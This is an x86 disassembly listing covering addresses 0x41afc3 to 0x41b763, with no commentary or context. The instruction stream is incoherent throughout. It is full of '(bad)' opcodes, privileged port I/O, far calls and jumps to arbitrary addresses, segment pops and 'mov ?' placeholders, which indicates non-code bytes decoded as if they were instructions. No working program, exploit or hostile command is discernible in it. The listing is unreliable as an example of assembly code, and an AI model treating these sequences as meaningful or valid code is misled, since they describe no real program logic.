  41afc3:	jl     0x41af59
  41afc5:	push   ds
  41afc6:	or     BYTE PTR [ecx+0x5d924e22],0x2d
  41afcd:	call   0x7ac8ee85
  41afd2:	scas   al,BYTE PTR es:[edi]
  41afd3:	sub    DWORD PTR [esp-0x7956658f],edx
  41afda:	aaa    
  41afdb:	dec    ecx
  41afdc:	mov    ?,WORD PTR [esi+0x53]
  41afdf:	cmp    DWORD PTR [ecx-0x77],0x74d566c0
  41afe6:	jge    0x41af8c
  41afe8:	adc    BYTE PTR [edi-0x3f],ch
  41afeb:	aad    0xc9
  41afed:	or     edi,edi
  41afef:	out    0x21,al
  41aff1:	fs adc al,0x8e
  41aff4:	jp     0x41af9c
  41aff6:	(bad)  
  41aff7:	in     al,dx
  41aff8:	and    al,0xa8
  41affa:	sbb    al,0xba
  41affc:	retf   0xd0d7
  41afff:	les    edx,FWORD PTR [esi]
  41b001:	and    dh,BYTE PTR [edx+edx*2]
  41b004:	test   al,0x7c
  41b006:	into   
  41b007:	data16 out dx,al
  41b009:	(bad)  
  41b00b:	mov    ds:0x3ad48d33,eax
  41b010:	add    BYTE PTR [edx+ecx*8],ch
  41b013:	aaa    
  41b014:	inc    esp
  41b015:	xchg   edi,eax
  41b016:	dec    ebx
  41b017:	push   edx
  41b018:	je     0x41b095
  41b01a:	inc    ebp
  41b01b:	stos   BYTE PTR es:[edi],al
  41b01c:	addr16 stc 
  41b01e:	lods   al,BYTE PTR ds:[esi]
  41b01f:	dec    ebx
  41b020:	jge    0x41b032
  41b022:	loop   0x41b060
  41b024:	pop    ds
  41b025:	add    al,0x63
  41b027:	mov    eax,ds:0x13d68dfd
  41b02c:	dec    esi
  41b02d:	int    0xdc
  41b02f:	lea    esi,[ebp-0x80]
  41b032:	aad    0xa7
  41b034:	cld    
  41b035:	(bad)  
  41b037:	push   cs
  41b038:	cmp    eax,0xe61e0b7f
  41b03d:	sub    DWORD PTR [edx-0x4d921909],0x99cf3e9c
  41b047:	add    BYTE PTR [eax-0x56],dl
  41b04a:	mov    cl,0x19
  41b04c:	xchg   DWORD PTR [esi-0x3e0c86e0],ecx
  41b052:	rcl    ebp,cl
  41b054:	inc    ebx
  41b055:	xchg   edx,eax
  41b056:	jbe    0x41b0d7
  41b058:	rcr    DWORD PTR [ecx-0x26],0xd0
  41b05c:	pop    esp
  41b05d:	ret    
  41b05e:	sub    BYTE PTR [esi+0x50],dh
  41b061:	adc    BYTE PTR [ebx-0x68bc6f29],dh
  41b067:	cmc    
  41b068:	or     BYTE PTR ds:0x376276cb,cl
  41b06e:	dec    esi
  41b06f:	imul   edi,DWORD PTR [ebp-0x57612204],0x18aab200
  41b079:	jno    0x41b051
  41b07b:	es cs retf 0x2b9e
  41b080:	dec    esp
  41b081:	mov    dl,0x7f
  41b083:	xchg   edi,eax
  41b084:	xor    DWORD PTR [esi],esp
  41b086:	outs   dx,BYTE PTR ds:[esi]
  41b087:	sub    BYTE PTR [esi],al
  41b089:	mov    ?,edi
  41b08b:	or     bl,ah
  41b08d:	add    bl,bl
  41b08f:	jge    0x41b0a8
  41b091:	push   ebx
  41b092:	cwde   
  41b093:	inc    esp
  41b094:	loope  0x41b0ee
  41b096:	pop    esi
  41b097:	fwait
  41b098:	adc    ah,BYTE PTR [eax-0x411cc6f]
  41b09e:	imul   edi,DWORD PTR [edi+0x3],0x7e
  41b0a2:	pop    es
  41b0a3:	leave  
  41b0a4:	push   ds
  41b0a5:	and    edx,DWORD PTR [esi+ecx*8]
  41b0a8:	sbb    bl,0x47
  41b0ab:	sti    
  41b0ac:	jae    0x41b02e
  41b0ae:	pushf  
  41b0af:	jmp    ecx
  41b0b1:	sbb    ch,0x25
  41b0b4:	cwde   
  41b0b5:	cmp    DWORD PTR [edi+0x7a58ae42],0xffffffb2
  41b0bc:	stc    
  41b0bd:	add    eax,0x73b01b72
  41b0c2:	mov    esi,0x89cf2d5e
  41b0c7:	xchg   DWORD PTR [ebx+0x66],ebx
  41b0ca:	fidiv  DWORD PTR [edi-0x7944ede3]
  41b0d0:	sub    al,0x31
  41b0d2:	retf   
  41b0d3:	pop    ss
  41b0d4:	es push 0x78
  41b0d7:	mov    ebp,0x1792f2d
  41b0dc:	(bad)  
  41b0de:	test   BYTE PTR [ecx+0x7c],0x13
  41b0e2:	arpl   si,di
  41b0e4:	rep stos DWORD PTR es:[edi],eax
  41b0e6:	pusha  
  41b0e7:	jbe    0x41b158
  41b0e9:	adc    dh,0x2d
  41b0ec:	dec    esi
  41b0ed:	cdq    
  41b0ee:	adc    ecx,DWORD PTR [eax-0x1b0beefa]
  41b0f4:	pop    edi
  41b0f5:	mov    ah,0x24
  41b0f7:	mov    dh,0x99
  41b0f9:	fs adc al,0x71
  41b0fc:	xchg   edx,eax
  41b0fd:	inc    esi
  41b0fe:	dec    ebp
  41b0ff:	lds    eax,FWORD PTR [eax-0x4c7ffd3a]
  41b105:	push   ds
  41b106:	adc    bl,BYTE PTR [eax-0x7]
  41b109:	jmp    0x41b0e5
  41b10b:	jle    0x41b100
  41b10d:	mov    eax,ds:0x5db7c668
  41b112:	(bad)
  41b115:	sbb    BYTE PTR [ebx-0x41],dl
  41b118:	pusha  
  41b119:	adc    DWORD PTR [edx+0x30],edx
  41b11c:	mov    esi,0xf825cdea
  41b121:	repz jmp 0xde2e:0x4bfe2f84
  41b129:	mov    edx,0x97d5c2af
  41b12e:	daa    
  41b12f:	iret   
  41b130:	and    BYTE PTR [eax+0x17],ch
  41b133:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b134:	adc    eax,0x966c2dd8
  41b139:	test   al,0xb0
  41b13b:	jecxz  0x41b148
  41b13d:	add    eax,0x29bd97d2
  41b142:	retf   
  41b143:	ret    0x2731
  41b146:	sub    dl,BYTE PTR [ecx+0x70]
  41b149:	loopne 0x41b157
  41b14b:	jmp    0x9efdd281
  41b150:	or     DWORD PTR [eax+0x57],edx
  41b153:	xchg   ebx,eax
  41b154:	ins    DWORD PTR es:[edi],dx
  41b155:	int    0xf5
  41b157:	xchg   esp,eax
  41b158:	call   0x6c00:0x799438f8
  41b15f:	push   DWORD PTR [edi+0x48]
  41b162:	clc    
  41b163:	inc    ecx
  41b164:	ja     0x41b1d9
  41b166:	sbb    edx,DWORD PTR [esi+0x1df284e6]
  41b16c:	rol    BYTE PTR [edx],0x9c
  41b16f:	and    eax,0x1903f351
  41b174:	das    
  41b175:	popa   
  41b176:	adc    al,0x11
  41b178:	jp     0x41b184
  41b17a:	(bad)  
  41b17b:	jo     0x41b1b1
  41b17d:	outs   dx,BYTE PTR ds:[esi]
  41b17e:	jne    0x41b1b9
  41b180:	xchg   ebp,eax
  41b181:	shr    DWORD PTR [edi],1
  41b183:	or     al,0xb2
  41b185:	js     0x41b174
  41b187:	fmul   QWORD PTR [edx+0x51fa77c5]
  41b18d:	pop    ecx
  41b18e:	std    
  41b18f:	push   edi
  41b190:	prefetch BYTE PTR [eax-0x53]
  41b194:	xchg   DWORD PTR [esi-0x14ec5b62],ebx
  41b19a:	adc    eax,0xc45e6c7d
  41b19f:	jbe    0x41b1e4
  41b1a1:	jmp    0xb61e4afe
  41b1a6:	call   0xeae9:0xd4d8ec60
  41b1ad:	push   DWORD PTR [edx-0x21]
  41b1b0:	pop    edi
  41b1b1:	xor    bl,BYTE PTR [ebx]
  41b1b3:	xchg   BYTE PTR [ebx-0x24],dh
  41b1b6:	dec    edx
  41b1b7:	repnz mov dl,0xf2
  41b1ba:	pop    ds
  41b1bb:	scas   eax,DWORD PTR es:[edi]
  41b1bc:	aas    
  41b1bd:	call   0x7726824c
  41b1c2:	sbb    esp,DWORD PTR [esi]
  41b1c4:	lahf   
  41b1c5:	xor    dh,dh
  41b1c7:	mov    bh,0x38
  41b1c9:	cs jmp 0xe2c9376f
  41b1cf:	lods   eax,DWORD PTR ds:[esi]
  41b1d0:	cmp    al,0x35
  41b1d2:	hlt    
  41b1d3:	out    0x91,eax
  41b1d5:	and    DWORD PTR [esi+0x1c],esp
  41b1d8:	fs call 0x3b03:0x84573b6a
  41b1e0:	scas   eax,DWORD PTR es:[edi]
  41b1e1:	xor    DWORD PTR [ecx-0x1551d82a],eax
  41b1e7:	push   eax
  41b1e8:	mov    ch,0x59
  41b1ea:	adc    ah,BYTE PTR [ecx+0xa4c970e]
  41b1f0:	test   BYTE PTR [ebx],bh
  41b1f2:	pop    ebx
  41b1f3:	push   edi
  41b1f4:	cmp    esp,DWORD PTR [ebp+esi*1-0x3]
  41b1f8:	mov    dh,0x33
  41b1fa:	loopne 0x41b24a
  41b1fc:	mov    ecx,0xecd8d160
  41b201:	mov    bl,0xa7
  41b203:	xlat   BYTE PTR ds:[ebx]
  41b204:	cmp    al,0x3b
  41b206:	adc    al,0xf0
  41b208:	pop    ebx
  41b209:	or     ebp,esi
  41b20b:	pop    ss
  41b20c:	pop    es
  41b20d:	jbe    0x41b272
  41b20f:	js     0x41b1e8
  41b211:	sar    DWORD PTR [ebp-0x2a07e8f2],cl
  41b217:	js     0x41b20b
  41b219:	sub    eax,0xfd88ef83
  41b21e:	xor    edi,DWORD PTR [esi+0x5a26cf8f]
  41b224:	mov    edi,0xfbb35c8b
  41b229:	and    BYTE PTR [edx+0x3960a5e9],cl
  41b22f:	(bad)  [esi-0x4e]
  41b232:	not    BYTE PTR [eax+0x47d7df3b]
  41b238:	xchg   BYTE PTR [edi+esi*2+0x72],bl
  41b23c:	pop    eax
  41b23d:	and    DWORD PTR [eax+0x78],0x18b30a19
  41b244:	pop    ds
  41b245:	fdivr  QWORD PTR [ebx]
  41b247:	adc    ebp,edi
  41b249:	jge    0x41b211
  41b24b:	inc    ecx
  41b24c:	es icebp 
  41b24e:	ins    BYTE PTR es:[edi],dx
  41b24f:	inc    ebx
  41b250:	xchg   ebx,esp
  41b252:	imul   ecx,eax,0x1b
  41b255:	sbb    DWORD PTR [ebp-0x18f2fc90],0x4345a58f
  41b25f:	sub    BYTE PTR [edi-0x61],al
  41b262:	fisubr DWORD PTR [ebp+0x46]
  41b265:	push   eax
  41b266:	in     eax,dx
  41b267:	loope  0x41b1f2
  41b269:	mov    bl,0xdf
  41b26b:	ds add edi,0xffffff96
  41b26f:	push   ds
  41b270:	shl    DWORD PTR [eax-0x45],cl
  41b273:	out    dx,eax
  41b274:	sbb    eax,0x2ebb834
  41b279:	fiadd  DWORD PTR [edx-0x7fb2d4a9]
  41b27f:	stos   BYTE PTR es:[edi],al
  41b280:	mov    ebp,DWORD PTR [edx+0x77]
  41b283:	nop
  41b284:	mov    eax,0x8c18a735
  41b289:	sub    eax,0xe8bad420
  41b28e:	ret    
  41b28f:	xor    DWORD PTR [eax+ebp*4+0x46660776],0xffffffdc
  41b297:	les    edi,FWORD PTR [esi+0x61]
  41b29a:	mov    WORD PTR [ebx+ebx*2-0x5483f768],?
  41b2a1:	dec    ebx
  41b2a2:	xchg   edi,eax
  41b2a3:	mov    dl,0x88
  41b2a5:	xor    al,0xc
  41b2a7:	and    al,0x25
  41b2a9:	jns    0x41b26a
  41b2ab:	push   es
  41b2ac:	popf   
  41b2ad:	push   ebp
  41b2ae:	inc    esi
  41b2af:	and    cl,cl
  41b2b1:	dec    BYTE PTR [edx]
  41b2b3:	pop    ss
  41b2b4:	cwde   
  41b2b5:	mov    al,0x14
  41b2b7:	enter  0x3a45,0x92
  41b2bb:	pop    eax
  41b2bc:	adc    eax,0xde9a4627
  41b2c1:	mov    gs,WORD PTR [eax-0x7ac11ed0]
  41b2c7:	mov    ebx,DWORD PTR [ecx+0x4f1818]
  41b2cd:	mov    al,ds:0x5b19061
  41b2d2:	xchg   esp,eax
  41b2d3:	outs   dx,DWORD PTR ds:[esi]
  41b2d4:	retf   0x682f
  41b2d7:	das    
  41b2d8:	xchg   esp,eax
  41b2d9:	mov    edx,0xe03df46b
  41b2de:	sbb    al,0xc5
  41b2e0:	jo     0x41b287
  41b2e2:	(bad)  
  41b2e3:	sahf   
  41b2e4:	std    
  41b2e5:	daa    
  41b2e6:	push   ds
  41b2e7:	shr    al,1
  41b2e9:	mov    BYTE PTR [ecx-0x1b6be0ab],bl
  41b2ef:	fwait
  41b2f0:	sub    dl,BYTE PTR ds:0xbb71a344
  41b2f6:	repnz std 
  41b2f8:	pop    ecx
  41b2f9:	inc    esp
  41b2fa:	lods   eax,DWORD PTR ds:[esi]
  41b2fb:	and    al,0xf5
  41b2fd:	mov    cl,0x17
  41b2ff:	jecxz  0x41b2d5
  41b301:	inc    esp
  41b302:	bound  edi,QWORD PTR [edx+0x45]
  41b305:	ds inc ecx
  41b307:	(bad)  
  41b308:	push   esp
  41b309:	xchg   esi,eax
  41b30a:	arpl   WORD PTR [ecx-0x7a],dx
  41b30d:	sub    esp,DWORD PTR [eax]
  41b30f:	sbb    cl,bl
  41b311:	in     al,dx
  41b312:	in     al,dx
  41b313:	test   DWORD PTR [edx+0x28],edx
  41b316:	push   esi
  41b317:	mov    esi,0x575c27e1
  41b31c:	xchg   bx,ax
  41b31e:	mov    dl,0xfd
  41b320:	cmp    ebx,DWORD PTR [ecx+0x4e]
  41b323:	cs pop edi
  41b325:	ins    BYTE PTR es:[edi],dx
  41b326:	push   edx
  41b327:	pshufw mm2,QWORD PTR [edx],0x9
  41b32b:	popa   
  41b32c:	in     eax,0x6c
  41b32e:	lock xor DWORD PTR [edi],0x7c
  41b332:	dec    edx
  41b333:	imul   ebp,DWORD PTR [ebp+edi*4+0x1e093dbf]
  41b33b:	aad    0x35
  41b33d:	ds int3 
  41b33f:	cld    
  41b340:	mov    ss,WORD PTR [ecx-0xe]
  41b343:	cmc    
  41b344:	lods   al,BYTE PTR ds:[esi]
  41b345:	mov    eax,edi
  41b347:	mov    cl,0x9c
  41b349:	jp     0x41b376
  41b34b:	mov    ss,esp
  41b34d:	sbb    eax,0xead0f72
  41b352:	mov    al,BYTE PTR [eax+0x2]
  41b355:	mov    cl,bl
  41b357:	gs pop edx
  41b359:	retf   0xcb05
  41b35c:	pusha  
  41b35d:	jnp    0x41b378
  41b35f:	xor    al,0xb8
  41b361:	test   BYTE PTR [edx],al
  41b363:	pusha  
  41b364:	std    
  41b365:	jg     0x41b3b1
  41b367:	add    DWORD PTR [ebp-0x312714e4],ecx
  41b36d:	daa    
  41b36e:	xchg   bh,dh
  41b370:	js     0x41b2fa
  41b372:	in     eax,dx
  41b373:	sbb    eax,0xe202a5b5
  41b378:	or     BYTE PTR [esi+edx*2-0x483b697e],ah
  41b37f:	push   ebp
  41b380:	xor    bh,BYTE PTR [ebx+0x14]
  41b383:	mov    di,0x1a5d
  41b387:	imul   esp,DWORD PTR [ebx-0x4c8c5ece],0xffffffbd
  41b38e:	add    ch,BYTE PTR [esi-0x52]
  41b391:	cmp    eax,0xdac29d0e
  41b396:	jge    0x41b3db
  41b398:	nop
  41b399:	cmc    
  41b39a:	arpl   WORD PTR [ecx-0x13a8a050],ax
  41b3a0:	sub    BYTE PTR [ecx],ch
  41b3a2:	mov    esp,0x259ee791
  41b3a7:	es pop edx
  41b3a9:	push   ax
  41b3ab:	inc    edx
  41b3ac:	or     DWORD PTR [esi-0x34],edx
  41b3af:	adc    BYTE PTR [edi-0x60],0x9e
  41b3b3:	pop    ebx
  41b3b4:	loopne 0x41b3ea
  41b3b6:	(bad)  
  41b3b7:	aas    
  41b3b8:	sbb    bl,0xed
  41b3bb:	pop    esp
  41b3bc:	sbb    eax,0x61fad848
  41b3c1:	mov    esi,es
  41b3c3:	test   DWORD PTR [eax-0x4513f20d],ecx
  41b3c9:	mov    ch,0x52
  41b3cb:	ja     0x41b384
  41b3cd:	loop   0x41b420
  41b3cf:	out    0x99,eax
  41b3d1:	dec    eax
  41b3d2:	cmp    DWORD PTR [eax],esi
  41b3d4:	inc    esi
  41b3d5:	loop   0x41b3db
  41b3d7:	shl    dh,cl
  41b3d9:	mov    eax,ds:0x2f12004c
  41b3de:	mov    edx,0x6e7f149b
  41b3e3:	pop    esi
  41b3e4:	aad    0x56
  41b3e6:	jp     0x41b414
  41b3e8:	dec    esi
  41b3e9:	test   BYTE PTR [ebx+0x39],ah
  41b3ec:	sub    ebp,0x4f
  41b3ef:	push   ds
  41b3f0:	xor    dl,BYTE PTR [ecx+esi*4]
  41b3f3:	aas    
  41b3f4:	mov    ds:0xb780898b,al
  41b3f9:	inc    edx
  41b3fa:	push   0x58b9c819
  41b3ff:	div    DWORD PTR [esi+0x4a]
  41b402:	sub    BYTE PTR [ebp+0x5a],bh
  41b405:	and    BYTE PTR [ebp+0x5c],0xfb
  41b409:	jmp    0x41b3cf
  41b40b:	sbb    eax,DWORD PTR [edi+0x62]
  41b40e:	test   ecx,esi
  41b410:	mov    ecx,0x3942e699
  41b415:	cmp    ah,ch
  41b417:	push   esp
  41b418:	in     eax,0xbc
  41b41a:	push   edi
  41b41b:	jbe    0x41b40d
  41b41d:	adc    eax,0xa8772475
  41b422:	sbb    DWORD PTR [edi],esi
  41b424:	fdiv   QWORD PTR [ebx+0xfe9174f]
  41b42a:	dec    eax
  41b42b:	lahf   
  41b42c:	retf   0x7
  41b42f:	pop    ds
  41b430:	scas   eax,DWORD PTR es:[edi]
  41b431:	clc    
  41b432:	add    al,0xa3
  41b434:	loop   0x41b47c
  41b436:	mov    DWORD PTR [ebx-0x29],ebp
  41b439:	jnp    0x41b3ed
  41b43b:	lock mov BYTE PTR [esi-0x15],cl
  41b43f:	fnstcw WORD PTR [esi-0x1184384d]
  41b445:	add    DWORD PTR [edx+0x3b],esp
  41b448:	test   eax,0x4a04a365
  41b44d:	cli    
  41b44e:	pop    eax
  41b44f:	push   eax
  41b450:	push   esp
  41b451:	dec    ebx
  41b452:	iret   
  41b453:	pop    eax
  41b454:	(bad)
  41b459:	std    
  41b45a:	push   0x2
  41b45c:	jb     0x41b47b
  41b45e:	jb     0x41b472
  41b460:	sub    al,0xed
  41b462:	cmp    ecx,DWORD PTR es:[ebx]
  41b465:	push   edx
  41b466:	mov    al,0xed
  41b468:	mov    ah,0x5d
  41b46a:	jle    0x41b428
  41b46c:	mov    cs:0x26dd2e33,al
  41b472:	std    
  41b473:	jmp    0x9890:0x4d6eecc0
  41b47a:	mov    ecx,edi
  41b47c:	sub    al,0xc5
  41b47e:	cdq    
  41b47f:	fisttp QWORD PTR [eax]
  41b481:	shl    edi,cl
  41b483:	cmp    BYTE PTR ss:[eax-0x4e],bh
  41b487:	mov    ecx,0x1fe79030
  41b48c:	inc    ebp
  41b48d:	and    eax,0x995c3792
  41b492:	or     ecx,0xffffff8e
  41b495:	or     BYTE PTR [ecx+0x2b],ah
  41b498:	inc    edx
  41b499:	retf   0x2963
  41b49c:	sub    dh,bl
  41b49e:	loopne 0x41b468
  41b4a0:	pop    esp
  41b4a1:	dec    eax
  41b4a2:	xchg   ebx,eax
  41b4a3:	ss and al,0x7d
  41b4a6:	mov    BYTE PTR es:[ebx+0x1b83abc2],ch
  41b4ad:	call   0xd3016e06
  41b4b2:	sbb    eax,0x5b395309
  41b4b7:	adc    al,0x71
  41b4b9:	adc    ah,ch
  41b4bb:	and    ah,ch
  41b4bd:	hlt    
  41b4be:	das    
  41b4bf:	in     eax,dx
  41b4c0:	mov    ds:0x4d13d460,eax
  41b4c5:	mov    dl,BYTE PTR [ecx+0x4c4d0ae8]
  41b4cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b4cc:	cmp    al,0x50
  41b4ce:	jmp    0x41b4e2
  41b4d0:	add    eax,0x8a94fe65
  41b4d5:	pop    ds
  41b4d6:	and    cl,BYTE PTR [esi-0x15]
  41b4d9:	addr16 out dx,al
  41b4db:	jp     0x41b557
  41b4dd:	mov    eax,0x81ecec5e
  41b4e2:	or     BYTE PTR [ebx+0x412cf9e0],0x55
  41b4e9:	sbb    eax,0x40faf244
  41b4ee:	sbb    al,0x48
  41b4f0:	sti    
  41b4f1:	xchg   esp,eax
  41b4f2:	sub    ah,BYTE PTR [ebx]
  41b4f4:	push   ebx
  41b4f5:	loop   0x41b4f6
  41b4f7:	(bad)  
  41b4f8:	ss inc ebp
  41b4fa:	xchg   DWORD PTR [ecx+edx*1-0x79],edi
  41b4fe:	stos   BYTE PTR es:[edi],al
  41b4ff:	ins    BYTE PTR es:[edi],dx
  41b500:	and    eax,0xf407b595
  41b505:	jae    0x41b57a
  41b507:	ins    BYTE PTR es:[edi],dx
  41b508:	vmwrite ebx,DWORD PTR [eax+0x180ccb94]
  41b50f:	cmp    esi,DWORD PTR [eax+0x74]
  41b512:	inc    esp
  41b513:	mov    bl,0xdc
  41b515:	outs   dx,BYTE PTR ds:[esi]
  41b516:	aam    0xe6
  41b518:	mov    edx,0xafd6c29d
  41b51d:	(bad)  
  41b51e:	lea    ebp,[ebp+0x25]
  41b521:	xchg   edi,eax
  41b522:	(bad)  
  41b523:	push   edx
  41b524:	mov    al,0x84
  41b526:	ss adc al,0xa3
  41b529:	fsubr  DWORD PTR [ecx-0x37]
  41b52c:	fadd   DWORD PTR [ecx+edx*8+0x19]
  41b530:	add    al,0x18
  41b532:	mov    al,ds:0x30b2a192
  41b537:	rcr    BYTE PTR [ebp-0x755fc3f9],0x94
  41b53e:	ins    DWORD PTR es:[edi],dx
  41b53f:	adc    eax,0xfc752254
  41b544:	test   BYTE PTR [ebp-0x33],bh
  41b547:	les    ecx,FWORD PTR [ecx+0x60]
  41b54a:	push   ds
  41b54b:	push   ebx
  41b54c:	xchg   DWORD PTR [esi-0x7c],ebp
  41b54f:	inc    DWORD PTR [edi]
  41b551:	fdivrp st(0),st
  41b553:	jmp    0x41b4d8
  41b555:	call   0xaff8:0x41db8deb
  41b55c:	hlt    
  41b55d:	dec    eax
  41b55e:	sti    
  41b55f:	imul   esi,DWORD PTR [eax],0x3e6c9e06
  41b565:	jnp    0x41b562
  41b567:	mov    ch,0x3f
  41b569:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b56a:	or     BYTE PTR [eax-0x67],dh
  41b56d:	dec    ebx
  41b56e:	call   0x8ffd751
  41b573:	clc    
  41b574:	mov    bh,0xd7
  41b576:	jmp    0x41b557
  41b578:	out    dx,al
  41b579:	inc    ecx
  41b57a:	mov    ?,esp
  41b57c:	ret    
  41b57d:	jmp    0x5dd55d69
  41b582:	mov    ch,0xbe
  41b584:	xchg   esp,eax
  41b585:	clc    
  41b586:	jg     0x41b52d
  41b588:	es xchg edi,eax
  41b58a:	dec    eax
  41b58b:	pop    ebx
  41b58c:	jg     0x41b51d
  41b58e:	mov    ch,BYTE PTR [eax]
  41b590:	out    0x60,al
  41b592:	ror    DWORD PTR [edi],1
  41b594:	pop    esi
  41b595:	adc    ebp,DWORD PTR [edi]
  41b597:	jle    0x41b614
  41b599:	mov    bh,0xcf
  41b59b:	and    DWORD PTR [ebx-0x41],eax
  41b59e:	dec    ebx
  41b59f:	mov    esi,0x5f165d12
  41b5a4:	in     al,dx
  41b5a5:	push   ebp
  41b5a6:	xor    al,0xbe
  41b5a8:	mov    WORD PTR [ebp+0x2b],ss
  41b5ab:	mov    bl,0xe8
  41b5ad:	xor    BYTE PTR [ebp+eax*2-0x1c77326f],dl
  41b5b4:	mov    ebx,0x7b33e851
  41b5b9:	xor    eax,0xb3659375
  41b5be:	adc    ebp,esp
  41b5c0:	imul   ebx,DWORD PTR [edi-0x564ec4e9],0x9b6ac858
  41b5ca:	pop    edx
  41b5cb:	jg     0x41b5c6
  41b5cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b5ce:	ror    BYTE PTR [ecx-0x1a],cl
  41b5d1:	push   edx
  41b5d2:	pushf  
  41b5d3:	mov    eax,ds:0xaf72e101
  41b5d8:	xchg   edx,eax
  41b5d9:	pop    esi
  41b5da:	pop    esp
  41b5db:	out    0xc7,al
  41b5dd:	mov    WORD PTR [ebp+0x11],es
  41b5e0:	addr16 dec edi
  41b5e2:	shl    DWORD PTR [ebx-0x314dce81],1
  41b5e8:	pop    ecx
  41b5e9:	fsubr  st(6),st
  41b5eb:	inc    ebx
  41b5ec:	pop    edi
  41b5ed:	pop    ds
  41b5ee:	add    al,0xc0
  41b5f0:	cmp    al,0xe3
  41b5f2:	aam    0x8
  41b5f4:	push   edx
  41b5f5:	push   ecx
  41b5f6:	jns    0x41b662
  41b5f8:	fsubr  st(5),st
  41b5fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b5fb:	mov    gs,WORD PTR [ebp+0x5651b4fb]
  41b601:	aaa    
  41b602:	inc    ebx
  41b603:	push   0x8a94552b
  41b608:	cmc    
  41b609:	sub    ecx,ebx
  41b60b:	pop    ds
  41b60c:	bound  edx,QWORD PTR [eax+0x181588be]
  41b612:	push   0x3c81a0f4
  41b617:	mov    ebx,DWORD PTR [edi+0x211a6dff]
  41b61d:	mov    ds,WORD PTR [ecx-0x5e597dca]
  41b623:	sar    DWORD PTR [eiz*8-0x9c59d6a],cl
  41b62a:	imul   esi,esi,0xac447d54
  41b630:	fsub   st,st(3)
  41b632:	dec    ebp
  41b633:	div    DWORD PTR [esi]
  41b635:	ror    BYTE PTR [ebp-0x6d],0xda
  41b639:	aad    0x17
  41b63b:	cmp    al,0x86
  41b63d:	sub    DWORD PTR [edx+0x17],ebx
  41b640:	sub    al,0x3d
  41b642:	enter  0xd698,0x1a
  41b646:	push   edx
  41b647:	test   eax,0x171f38e7
  41b64c:	xor    eax,0x3486fbd5
  41b651:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b652:	jno    0x41b699
  41b654:	adc    eax,0x622d765c
  41b659:	test   eax,0x47f018fe
  41b65e:	xchg   edi,eax
  41b65f:	mov    esi,ebp
  41b661:	mov    dh,BYTE PTR es:[esi-0x23ec0588]
  41b668:	and    al,0xd
  41b66a:	js     0x41b60c
  41b66c:	fist   WORD PTR [eax]
  41b66e:	add    DWORD PTR [ecx-0x1f93d7e8],edx
  41b674:	inc    edi
  41b675:	jae    0x41b679
  41b677:	sti    
  41b678:	mov    esp,0xdc25be34
  41b67d:	pop    edi
  41b67e:	gs jle 0x41b660
  41b681:	loop   0x41b6c9
  41b683:	les    esp,FWORD PTR [edx]
  41b685:	stos   DWORD PTR es:[edi],eax
  41b686:	ss mov bh,0xe3
  41b689:	stos   BYTE PTR es:[edi],al
  41b68a:	icebp  
  41b68b:	xchg   ebp,edx
  41b68d:	lods   al,BYTE PTR ds:[esi]
  41b68e:	dec    ecx
  41b68f:	mov    esp,0x8b42136d
  41b694:	fisubr DWORD PTR [esi-0x7a]
  41b697:	outs   dx,DWORD PTR ds:[esi]
  41b698:	(bad)  
  41b699:	int3   
  41b69a:	xor    bl,cl
  41b69c:	hlt    
  41b69d:	adc    esp,DWORD PTR [ecx-0x12]
  41b6a0:	xchg   edi,eax
  41b6a1:	mov    esi,0xab109d4c
  41b6a6:	ja     0x41b6bc
  41b6a8:	push   es
  41b6a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b6aa:	adc    ch,BYTE PTR [edx+0x72]
  41b6ad:	rol    DWORD PTR [ecx],0x32
  41b6b0:	ins    BYTE PTR es:[edi],dx
  41b6b1:	jmp    0x41b704
  41b6b3:	stos   BYTE PTR es:[edi],al
  41b6b4:	test   DWORD PTR [edx],esi
  41b6b6:	mov    bh,0xff
  41b6b8:	fist   WORD PTR [ecx+0x5a]
  41b6bb:	xchg   esi,eax
  41b6bc:	daa    
  41b6bd:	xor    eax,0xc9d6501b
  41b6c2:	mov    dh,0xe3
  41b6c4:	(bad)  
  41b6c5:	cmp    ebp,ecx
  41b6c7:	test   al,0x4f
  41b6c9:	mov    BYTE PTR [esi-0x13ba52cf],ah
  41b6cf:	jle    0x41b70b
  41b6d1:	cmp    bh,BYTE PTR [eax+0x3e5637b5]
  41b6d7:	sbb    eax,0xc80df35b
  41b6dc:	jle    0x41b6ba
  41b6de:	pop    edx
  41b6df:	(bad)  
  41b6e1:	mov    cl,ch
  41b6e3:	outs   dx,DWORD PTR ds:[esi]
  41b6e4:	inc    eax
  41b6e5:	jg     0x41b728
  41b6e7:	popf   
  41b6e8:	push   ebp
  41b6e9:	dec    edx
  41b6ea:	adc    esi,DWORD PTR [eax]
  41b6ec:	jae    0x41b716
  41b6ee:	cmp    esp,ebp
  41b6f0:	fcmovne st,st(5)
  41b6f2:	xor    bl,dh
  41b6f4:	xchg   BYTE PTR [ebx],dh
  41b6f6:	xor    ch,bh
  41b6f8:	adc    eax,0xecaa889a
  41b6fd:	sbb    al,0xf9
  41b6ff:	inc    edx
  41b700:	mov    ah,0xb9
  41b702:	xchg   DWORD PTR [ebx+0x54],ecx
  41b705:	pop    ebx
  41b706:	fld    QWORD PTR [ebp+0x18]
  41b709:	mov    eax,ds:0xea85b507
  41b70e:	mov    dh,0x56
  41b710:	mov    ebx,0x48fe8297
  41b715:	loop   0x41b6e5
  41b717:	mov    eax,0xa087cf7a
  41b71c:	mov    al,ds:0x7a92ac93
  41b721:	cmp    BYTE PTR [ebp-0x46c0c3f1],0xd9
  41b728:	imul   bl
  41b72a:	fwait
  41b72b:	es dec eax
  41b72d:	mov    ?,edx
  41b72f:	mov    ebp,0x36cc267e
  41b734:	mov    eax,0xdb95390d
  41b739:	sbb    eax,0xb9254b9c
  41b73e:	push   esp
  41b73f:	xchg   ecx,eax
  41b740:	fwait
  41b741:	rcl    BYTE PTR [eax-0x50],0x73
  41b745:	stc    
  41b746:	mov    ds:0x370987a5,al
  41b74b:	pusha  
  41b74c:	pop    esp
  41b74d:	mov    edx,0xe1cebd6e
  41b752:	cld    
  41b753:	mov    al,ds:0x90ab52de
  41b758:	jmp    0x1eb455fe
  41b75d:	jo     0x41b792
  41b75f:	pusha  
  41b760:	push   eax
  41b761:	loopne 0x41b76a
  41b763:	push   esi
